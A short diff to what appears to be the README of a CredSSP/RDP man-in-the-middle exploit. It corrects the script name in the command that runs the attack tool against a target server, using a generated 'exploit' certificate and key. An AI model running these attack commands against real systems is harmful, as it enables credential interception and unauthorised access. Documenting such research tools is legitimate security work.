@@ -36,5 +36,5 @@ $ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem 
 To run the attack script: 
 
 ```
-$ python /usr/local/bin/rdpy-rpdcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
+$ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
 ```
